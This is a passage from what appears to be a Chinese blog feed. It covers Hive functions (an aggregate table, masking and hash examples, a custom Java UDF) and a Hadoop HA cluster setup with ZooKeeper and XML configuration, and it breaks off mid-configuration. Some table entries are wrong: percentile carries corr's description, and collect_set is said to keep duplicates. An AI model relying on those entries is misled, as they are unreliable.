<td style="text-align:center">返回组中一对数字列的总体协方差</td>
</tr>
<tr>
<td style="text-align:center">DOUBLE</td>
<td style="text-align:center">covar_samp(col1, col2)</td>
<td style="text-align:center">返回组中一对数字列的协方差</td>
</tr>
<tr>
<td style="text-align:center">DOUBLE</td>
<td style="text-align:center">corr(col1, col2)</td>
<td style="text-align:center">返回该组中一对数字列的相关性的皮尔森系数</td>
</tr>
<tr>
<td style="text-align:center">DOUBLE</td>
<td style="text-align:center">percentile(BIGINT col, p)</td>
<td style="text-align:center">返回该组中一对数字列的相关性的皮尔森系数</td>
</tr>
<tr>
<td style="text-align:center">DOUBLE</td>
<td style="text-align:center">regr_count(independent, dependent)</td>
<td style="text-align:center">返回用于适应线性回归直线的非空对的数量</td>
</tr>
<tr>
<td style="text-align:center">array</td>
<td style="text-align:center">collect_set(col)</td>
<td style="text-align:center">返回一组具有重复元素的对象。</td>
</tr>
<tr>
<td style="text-align:center">array</td>
<td style="text-align:center">collect_list(col)</td>
<td style="text-align:center">返回一个具有重复的对象列表</td>
</tr>
<tr>
<td style="text-align:center">INTEGER</td>
<td style="text-align:center">ntile(INTEGER x)</td>
<td style="text-align:center">将一个有序分区划分为一个名为bucket的x组，并将一个bucket编号分配给分区中的每一行。</td>
</tr>
</tbody>
</table>
</div>
<h2 id="遮盖-加密-函数"><a href="#遮盖-加密-函数" class="headerlink" title="遮盖(加密)函数"></a>遮盖(加密)函数</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 遮盖前几个</span></span><br><span class="line"><span class="keyword">select</span> mask_first_n(<span class="string">'1234_4332_32'</span>,<span class="number">4</span>);<span class="comment">-- nnnn_4332_32</span></span><br><span class="line"><span class="comment">-- 遮盖后几个</span></span><br><span class="line"><span class="keyword">select</span> mask_last_n(<span class="string">'1234_4332_32'</span>,<span class="number">4</span>);<span class="comment">-- 1234_433n_nn</span></span><br><span class="line"><span class="comment">-- 前几个显示</span></span><br><span class="line"><span class="keyword">select</span> mask_show_first_n(<span class="string">'1234_4332_32'</span>,<span class="number">2</span>);<span class="comment">-- 12nn_nnnn_nn</span></span><br><span class="line"><span class="comment">-- 后几个显示</span></span><br><span class="line"><span class="keyword">select</span> mask_show_last_n(<span class="string">'1234_4332_32'</span>,<span class="number">2</span>);<span class="comment">--  nnnn_nnnn_32</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- hash函数</span></span><br><span class="line"><span class="keyword">select</span> mask_hash(<span class="string">'123456'</span>);<span class="comment">-- e10adc3949ba59abbe56e057f20f883e</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取当前用户</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">current_user</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 当前数据库</span></span><br><span class="line"><span class="keyword">select</span> current_database();</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 登录用户</span></span><br><span class="line"><span class="keyword">select</span> logged_in_user();</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取md5</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">md5</span>(<span class="string">'123456'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- crc32</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">crc32</span>(<span class="string">'1234'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- sha,sha加密</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">sha</span>(<span class="string">'123456'</span>),<span class="keyword">sha1</span>(<span class="string">'123456'</span>),<span class="keyword">sha2</span>(<span class="string">'123456'</span>,<span class="number">224</span>);<span class="comment">--  7c4a8d09ca3762af61e59520943dc26494f8941b  | 7c4a8d09ca3762af61e59520943dc26494f8941b  | f8cdb04495ded47615258f9dc6a3f4707fd2405434fefc3cbf4ef4e6</span></span><br></pre></td></tr></table></figure>
<p>aes加解密,反射不做演示.</p>
<h1 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h1><p>编写Hive函数,实体类需要继承UDF,需要有自定义方法evaluate。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.xwolf.big.hive;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hive.ql.exec.UDF;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 转化为大写字母</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> xwolf</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.8</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UpperCase</span> <span class="keyword">extends</span> <span class="title">UDF</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Text <span class="title">evaluate</span><span class="params">(<span class="keyword">final</span> Text s)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (s == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Text(s.toString().toUpperCase());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将文件打包为jar,上传到hive lib目录下,重启hive。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">##创建自定义函数</span></span><br><span class="line">create <span class="keyword">function</span> to_upper_case  as <span class="string">'com.xwolf.big.hive.UpperCase'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">##使用函数</span></span><br><span class="line">select to_upper_case(<span class="string">'afdsf343'</span>);</span><br><span class="line">+-- -- -- -- -- -+</span><br><span class="line">|    _c0    |</span><br><span class="line">+-- -- -- -- -- -+</span><br><span class="line">| AFDSF343  |</span><br><span class="line">+-- -- -- -- -- -+</span><br><span class="line">1 row selected (1.429 seconds)</span><br><span class="line"></span><br><span class="line"><span class="comment">##查看函数描述</span></span><br><span class="line">describe <span class="keyword">function</span> to_upper_case;+-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- +</span><br><span class="line">|                      tab_name                      |</span><br><span class="line">+-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- +</span><br><span class="line">| There is no documentation <span class="keyword">for</span> <span class="keyword">function</span> <span class="string">'to_upper_case'</span> |</span><br><span class="line">+-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- +</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+UDF" target="_blank" rel="noopener">Hive 官方文档</a></li>
<li><a href="https://cwiki.apache.org/confluence/display/Hive/HivePlugins" target="_blank" rel="noopener">自定义函数官方文档</a></li>
<li><a href="https://en.wikipedia.org/wiki/Soundex" target="_blank" rel="noopener">Soundex</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>hive</tag>
      </tags>
  </entry>
  <entry>
    <title>Hadoop HA 环境搭建</title>
    <url>/2017/10/25/%E5%A4%A7%E6%95%B0%E6%8D%AE/Hadoop%20HA%20%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h6 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h6><blockquote>
<ul>
<li>JDK(1.8),<a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html" target="_blank" rel="noopener">下载</a></li>
<li>zookeeper(3.4.9),<a href="http://mirror.bit.edu.cn/apache/zookeeper/" target="_blank" rel="noopener">下载</a></li>
<li>Hadoop (2.7.4),<a href="http://hadoop.apache.org/releases.html" target="_blank" rel="noopener">下载</a></li>
</ul>
</blockquote>
<h1 id="一、节点布局"><a href="#一、节点布局" class="headerlink" title="一、节点布局"></a>一、节点布局</h1><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">IP</th>
<th style="text-align:center">节点信息</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">hadoop01</td>
<td style="text-align:center">ZK、nameNode、resourceManager</td>
</tr>
<tr>
<td style="text-align:center">hadoop02</td>
<td style="text-align:center">ZK、nameNode、resourceManager</td>
</tr>
<tr>
<td style="text-align:center">hadoop03</td>
<td style="text-align:center">ZK、 dataNode、nodeManager</td>
</tr>
<tr>
<td style="text-align:center">hadoop04</td>
<td style="text-align:center">dataNode、nodeManager</td>
</tr>
<tr>
<td style="text-align:center">hadoop05</td>
<td style="text-align:center">dataNode、nodeManager</td>
</tr>
</tbody>
</table>
</div>
<h1 id="二、Zookeeper-搭建"><a href="#二、Zookeeper-搭建" class="headerlink" title="二、Zookeeper 搭建"></a>二、Zookeeper 搭建</h1><blockquote>
<h1 id="2-1-JDK安装及环境变量"><a href="#2-1-JDK安装及环境变量" class="headerlink" title="2.1 JDK安装及环境变量"></a>2.1 JDK安装及环境变量</h1></blockquote>
<pre><code> 忽略
</code></pre><blockquote>
<h1 id="2-2-Linux免密登录"><a href="#2-2-Linux免密登录" class="headerlink" title="2.2 Linux免密登录"></a>2.2 Linux免密登录</h1><h3 id="2-2-1-主机名或者IP映射"><a href="#2-2-1-主机名或者IP映射" class="headerlink" title="2.2.1 主机名或者IP映射"></a>2.2.1 主机名或者IP映射</h3></blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts/</span><br></pre></td></tr></table></figure>
<p>添加IP和主机名的映射关系后保存</p>
<p>127.0.0.1       localhost</p>
<p>::1             localhost</p>
<p>172.16.253.129  mysql</p>
<p>172.16.253.158  hadoop01</p>
<p>172.16.253.159  hadoop02</p>
<p>172.16.253.160  hadoop03</p>
<p>172.16.253.161  hadoop04</p>
<p>172.16.253.162  hadoop05</p>
<p>其他服务器上执行相同操作.</p>
<blockquote>
<h3 id="2-2-2-免密登录"><a href="#2-2-2-免密登录" class="headerlink" title="2.2.2 免密登录"></a>2.2.2 免密登录</h3></blockquote>
<p>在Hadoop01上生成rsa秘钥,</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/gXjfEDP.png" alt></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">分发公钥到目标机器</span><br><span class="line"></span><br><span class="line">ssh-copy-id -i /root/.ssh/id_rsa.pub 用户名@对方机器IP (注意不要忘记了参数-i)</span><br><span class="line"></span><br><span class="line">注：ssh-copy-id -i 是最简单的办法，如果不用这个，就得分下面二个步骤:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#将公钥复制到其他服务器上</span></span><br><span class="line"></span><br><span class="line">scp  /root/.ssh/id_rsa.pub 用户名@IP:/root/.ssh/</span><br><span class="line"></span><br><span class="line"><span class="comment">#公钥内容保存到authorized_keys</span></span><br><span class="line"></span><br><span class="line">cat /root/.ssh/id_rsa.pub &gt;&gt; authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># ssh 主机名,直接登录成功,表示免密登录配置成功</span></span><br><span class="line"></span><br><span class="line">ssh hadoop05</span><br></pre></td></tr></table></figure>
<blockquote>
<p>2.3 ZK集群搭建</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建zookeeper data 目录</span></span><br><span class="line">mkdir -p /opt/datas/zookeeper/</span><br><span class="line"><span class="comment">#创建myid文件</span></span><br><span class="line">touch /opt/datas/zookeeper/myid</span><br><span class="line"><span class="comment">#标记当前服务的ID,不同的服务器此处不一样</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt;&gt;  /opt/datas/zookeeper/myid</span><br></pre></td></tr></table></figure>
<p>配置zoo.cfg</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#数据目录</span></span><br><span class="line">dataDir=/opt/datas/zookeeper</span><br><span class="line"><span class="comment">#日志目录</span></span><br><span class="line">dataLogDir=/opt/hadoop/zookeeper-3.4.9/logs/</span><br><span class="line"><span class="comment">#端口</span></span><br><span class="line">clientPort=2181</span><br><span class="line"><span class="comment">#集群信息</span></span><br><span class="line">server.1=hadoop01:2888:3888</span><br><span class="line">server.2=hadoop02:2888:3888</span><br><span class="line">server.3=hadoop03:2888:3888</span><br></pre></td></tr></table></figure>
<p>将zookeeper 分发到其他要配置的服务器指定目录中,防火墙做好策略</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#启动zk</span></span><br><span class="line">/opt/hadoop/zookeeper/zkServer.sh start</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看状态,正常则显示leader或follower</span></span><br><span class="line">/opt/hadoop/zookeeper/zkServer.sh status</span><br></pre></td></tr></table></figure>
<blockquote>
<p>三、Hadoop 集群搭建</p>
<h1 id="3-1-Hadoop-配置"><a href="#3-1-Hadoop-配置" class="headerlink" title="3.1  Hadoop 配置"></a>3.1  Hadoop 配置</h1></blockquote>
<p>hadoop-env.sh,Hadoop 环境配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#明确java路径</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/java/jdk_1_8</span><br></pre></td></tr></table></figure>
<p>core-site.xml,hadoop 核心配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://hn1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.tmp.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span>&gt;</span>file:/opt/datas/hadoop/tmp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   </span><br><span class="line">   <span class="comment">&lt;!--HA zookeeper--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>ha.zookeeper.quorum<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop01:2181,hadoop02:2181,hadoop03:2181<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>hdfs-site.xml,HDFS配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.replication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.webhdfs.enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--datanode 目录--&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.datanode.data.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">value</span>&gt;</span>file:/opt/datas/hadoop/dfs/data<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">&lt;!--namenode--&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">property</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.name.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>file:/opt/datas/hadoop/dfs/name<span class="tag">&lt;/<span class="name">value</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span>  </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--指定hdfs的nameservice为hn1，需要和core-site.xml中的保持一致 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.nameservices<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>hn1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- hn1下面有两个NameNode，分别是nn1，nn2 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.ha.namenodes.hn1<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>nn1,nn2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- nn1的RPC通信地址 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.rpc-address.hn1.nn1<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop01:9000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- nn1的http通信地址 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.http-address.hn1.nn1<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop01:50070<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- nn2的RPC通信地址 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.rpc-address.hn1.nn2<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop02:9000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- nn2的http通信地址 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.http-address.hn1.nn2<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop02:50070<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 指定NameNode的元数据在JournalNode上的存放位置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.shared.edits.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>qjournal://hadoop03:8485;hadoop04:8485;hadoop05:8485/hn1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 指定JournalNode在本地磁盘存放数据的位置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.journalnode.edits.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>/opt/datas/hadoop/journal<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 开启NameNode失败自动切换 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.ha.automatic-failover.enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置失败自动切换实现方式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.client.failover.proxy.provider.hn1<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.hadoop.hdfs.server.namenode.ha.ConfiguredFailoverProxyProvider<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置隔离机制方法，多个机制用换行分割，即每个机制暂用一行--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.ha.fencing.methods<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">sshfence</span><br><span class="line">shell(/bin/true)</span><br><span class="line"><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 使用sshfence隔离机制时需要ssh免登陆 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.ha.fencing.ssh.private-key-files<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>/root/.ssh/id_rsa<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置sshfence隔离机制超时时间 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.ha.fencing.ssh.connect-timeout<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>30000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>mapred-site.xml,配置map reduce</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 指定mr框架为yarn方式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.framework.name<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>yarn<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>yarn-site.xml,配置yarn任务调度相关</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!-- 开启RM高可用 --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.ha.enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span>  </span><br><span class="line">    <span class="comment">&lt;!-- 指定RM的cluster id --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.cluster-id<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;<span class="name">value</span>&gt;</span>yrc1<span class="tag">&lt;/<span class="name">value</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span>  </span><br><span class="line">    <span class="comment">&lt;!-- 指定RM的名字 --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.ha.rm-ids<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;<span class="name">value</span>&gt;</span>rm1,rm2<span class="tag">&lt;/<span class="name">value</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span>  </span><br><span class="line">    <span class="comment">&lt;!-- 分别指定RM的地址 --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.hostname.rm1<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop01<span class="tag">&lt;/<span class="name">value</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.hostname.rm2<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop02<span class="tag">&lt;/<span class="name">value</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span>  </span><br><span class="line">    <span class="comment">&lt;!-- 指定zk集群地址 --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.zk-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop01:2181,hadoop02:2181,hadoop03:2181<span class="tag">&lt;/<span class="name">value</span>&gt;</span>  